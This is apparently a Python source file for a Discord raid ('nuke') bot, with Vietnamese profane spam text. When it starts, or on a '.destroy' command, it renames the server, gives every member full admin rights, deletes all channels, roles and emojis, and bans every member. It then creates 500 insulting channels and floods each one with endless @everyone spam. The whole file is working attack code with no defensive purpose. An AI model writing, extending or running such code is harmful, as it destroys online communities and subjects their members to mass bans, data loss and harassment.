from asyncio import tasks
from msilib.schema import Icon
from unicodedata import name
import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style

import keepalive_pkg
token = "" #<== your client token here!
#print(discord.__version__)


SPAM_CHANNEL =  ["Lồn con mẹ mày" , "BÚ CẶC TAO" , "NGU LỒN" , "ẳng ẳng","giỏi kick bố mày","sex gay",'địt cụ chúng mày😏']
SPAM_MESSAGE = ["@everyone Quá ghê gớm….🌚😳Và đây là Folontilô!😱😱Folontilô ui… 🥶🥶👿😳một tình huống múa phải nói là cực 👿gắt!!*music🤯Thẹn thùng nhìn em quay gót đi mãi😞😞💔Anh đứng chết lặng trong mưa😭😭Dù rằng bên😊😊 em đã có aiNhưng nơi đây anh 🤗🤗🥱vẫn còn chờ…Không biết anh Thành Vũ có biết Tú có Ny hay không, chúng tôi biết rằng tú có ny là người chơi khá nổi tiếng với con bài Florentino, ngày hôm nay anh ta đi cầm Florentino và chơi rất hay, trận thi đấu vừa xong là trận thi đấu mà chúng ta có thể thấy rằng là các bạn khán giả cũng có kĩ năng rất tốt- đặc biệt là người chơi bên phía của đội tuyển Đồng 5 đội tuyển Trái Đất đó là Tú có Ny, tôi thấy rằng anh ta chưa để cái tốc biến mình hồi được hiện xanh quá lâu anh ta sử dụng ngay lập tức bằng những tình huống mở giao tranh của mình và chính Tú có Ny là MVP của trận thi đấu này với 14.0 điểm MVPMột tình huống mà có lẽ Flo đang làm quá nhiều điều, những tình huống bông muq muq muq muq, bỏ chạy với Flo, Flo đang múa quá nhức nách, phải nói là Flo võ công quá cao cườngVà đây là Florentino, Florentino ui một cái tình huống phải nói là cực gắt. Tú có Ny và người chơi này có lẽ sẽ có Ny thôi, đánh quá ghê. Những tình huống bông hoa bông hủng phải nói là đúng top 1 buff bẩn"]

client = commands.Bot(command_prefix=".")

with open('/Users/Administrator/PycharmProjects/pythonProject/raid/phái yeager.png', 'rb') as f:
  icon = f.read()
@client.event
async def on_ready():
  print(Fore.GREEN+ 'We have logged in as {0.user}'.format(client)+ Fore.RESET)
  guild = client.get_guild(914784811057545216)
  try:
      await client.guild.edit(name='Rung chấn bắt đầu')
      await client.guild.edit(icon=icon)
      print(Fore.GREEN + f"I was edited name guild to {name}" + Fore.RESET)
  except:
    print(Fore.GREEN + "can't change the guild name" + Fore.RESET)
  try:
    role = discord.utils.get(guild.roles, name = "@everyone")
    await role.edit(permissions = Permissions.all())
    print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
  except:
    print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
  for channel in guild.channels:
    try:
      await channel.delete()
      print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
    except:
      print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
  for member in guild.members:
    try:
      await member.ban()
      print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
    except:
      print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
  for role in guild.roles:
    try:
      await role.delete()
      print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
    except:
      print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)
  for emoji in list(guild.emojis):
    try:
      await emoji.delete()
      print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
    except:
      print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
  banned_users = await guild.bans()
  for ban_entry in banned_users:
    user = ban_entry.user
      # while True:
      #   giang = await client.fetch_user('925032690057609266')
      #   if giang in banned_users:
      #     await ctx.guild.unban(giang)
      #     print(f'unban {giang}')
      #   else:
      #     print("Fail to unban giang")
    giang = await client.fetch_user('925032690057609266')
    e = user.id
    try: 
        # await user.unban("Jett#7303")
      await guild.unban('925032690057609266')
        # await user.unban('Migos#7683')
      print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
    except:
      print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
  await guild.create_text_channel("Thủy tổ")
  for channel in guild.text_channels:
      link = await channel.create_invite(max_age = 0, max_uses = 0)
      print(Fore.RED+ f"New Invite: {link}"+ Fore.RESET)
  amount = 500
  for i in range(amount):
    await guild.create_text_channel(random.choice(SPAM_CHANNEL))
  print(f"Raided {guild.name} Successfully.")
  return

@client.command()
async def STOP(ctx):
    await ctx.bot.logout()
    print (Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)

@client.command()
async def destroy(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      await ctx.guild.edit(name='Rung chấn bắt đầu')
      await ctx.guild.edit(icon=icon)
      print(Fore.GREEN + f"I was edited name guild to {name}" + Fore.RESET)
    except:
      print(Fore.GREEN + "can't change the guild name" + Fore.RESET)
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
    except:
      print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
    for member in guild.members:
     try:
       await member.ban()
       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
    for role in guild.roles:
     try:
       await role.delete()
       print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
      # while True:
      #   giang = await client.fetch_user('925032690057609266')
      #   if giang in banned_users:
      #     await ctx.guild.unban(giang)
      #     print(f'unban {giang}')
      #   else:
      #     pass
      giang = await client.fetch_user('925032690057609266')
      e = user.id
      try: 
        # await user.unban("Jett#7303")
        await ctx.guild.unban('925032690057609266')
        # await user.unban('Migos#7683')
        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
    await guild.create_text_channel("Thủy tổ")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(Fore.RED+ f"New Invite: {link}"+ Fore.RESET)
    amount = 500
    for i in range(amount):
      await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"Raided {guild.name} Successfully.")
    return
@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))
client.run(token, bot=True)